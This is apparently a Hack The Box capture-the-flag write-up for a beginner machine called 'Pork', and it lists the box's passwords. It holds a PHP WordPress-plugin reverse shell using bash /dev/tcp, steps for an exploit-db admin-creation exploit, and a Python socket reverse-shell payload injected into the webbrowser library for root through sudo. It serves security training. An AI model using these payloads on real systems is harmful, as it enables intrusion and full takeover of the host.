# PORK

## Introduction

This box is designed for beginners, players will find misconfiguration of python library called Python Library Hijacking, some encrypted messages to train players about CTF and exploitable wordpress plugins.
I was very challenged to make this machine because I found some industries from my clients not paying attention to some of their server configurations and rarely patching applications that have issued certain CVEs. 

## Info for HTB

### Access

Passwords:

| User     | Password                            |
| ---------| ----------------------------------- |
| d3nt1    | l0v35u64r							 |
| parul14n | napinadar							 |
| root     | saksangnamargota					 |

### Key Processes

Apache Web Server
- Wordpress that points to the `pork.htb` link has a vulnerability to `TheCartPress Plugin V1.5.3.6` which allows attackers to gain wordpress admin access, and should not be updated.

Encrypted messages 
- `mine.bak` encrypted with NATO Phonetic Alphabet
- `.msgenc` enrypted with base64

Modifiable Python libraries 

### Automation / Crons

### Firewall Rules

Port `22` or SSH can only be accessed via user d3nt1

### Docker

We find Apache and SSH running on their usual ports.

### Wordpress

Browsing to port 80 redirects us to pork.htb.
Add pork.htb to the hosts file and browse to it. We come across a website with Wordpress.

### Foothold

Get information that Wordpress uses TheCartPress 1.5.3.6 Plugin, the exploit can be seen in [exploit-db](https://www.exploit-db.com/exploits/50378) 

After downloading it we can see several lines of information related to the exploit, then find the user and password to be created.

```
       data = {
        "tcp_new_user_name" : "admin_02",
        "tcp_new_user_pass" : "admin1234",
        "tcp_repeat_user_pass" : "admin1234",
        "tcp_new_user_email" : "test@test.com",
        "tcp_role" : "administrator"
        }
```

Run with `python3 epxloit.py http://pork.htb`

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/pork]
â””â”€# python3 exploit.py http://pork.htb

Inserting admin...
Success!
Now login at /wp-admin/
```

login to wordpress with the user and password created by the exploit

### Shell

make a plugin to get a shell, you can read about it [here](https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell) or you can use [pentestmonkey reverse shell php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

```
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/[ipattacker]/[portattacker] 0>&1'");
?>
```

save with the name you want for example shell.php then archive it into a zip file.
upload the zip file in the plugin menu and activate it.

## Lateral Movement

searched some important files and got mine.bak 

![img](assets/4.PNG)

decode using [dcode.fr](https://www.dcode.fr/alphabet-phonetique-otan) and get the following result

![img](assets/5.PNG)

use ssh to access user d3nt1

![img](assets/6.PNG)

found a hidden file named .msgenc , its contents are an encoded message.

![img](assets\7.PNG)

i used [cyberchef](https://gchq.github.io/CyberChef/) to decode the message and got the following result

```
Dear D3nt1

Im Sorry, I'm Sick right now.
can you help me?
please login to my account
my password is napinadar
please open the browser in your desktop to see
how big profit we sell.
```

After these messages we get a password that is `napinadar`, check the user with `cat /etc/passwd` and get the user `parul14n`
here we can get user.txt

![img](assets/8.PNG)

## Privilege Escalation

Check with ```sudo -l```

![img](assets/9.PNG)

User `parul14n` can access `python3.8` and `benefit.py` with sudo access without password.
Check the `benefit.py` file and we can see that it calls the python library `webbrowser`, we can't edit the file, but we can edit the `webbrowser.py` library

![img](assets/10.PNG)

After understanding a few lines of code add [payload](https://www.oreilly.com/library/view/hands-on-red-team/9781788995238/cd15b05d-822f-494d-939a-ae5a671222ff.xhtml) after the following line of code

```
def open(url, new=0, autoraise=True):
    """Display url using the default browser.

    If possible, open url in a location determined by new.
    - 0: the same browser window (the default).
    - 1: a new browser window.
    - 2: a new browser page ("tab").
    If possible, autoraise raises the window (the default) or not.
    """
	
    #PAYLOAD
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ipattacker",portattacker));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
	
    if _tryorder is None:
        with _lock:
            if _tryorder is None:
                register_standard_browsers()
```

![img](assets/11.PNG)

Executing the commands `sudo /usr/bin/python3.8 /home/parul14n/Desktop/benefit.py` should give us a reverse shell as Root, after which the final flag can be accessed.
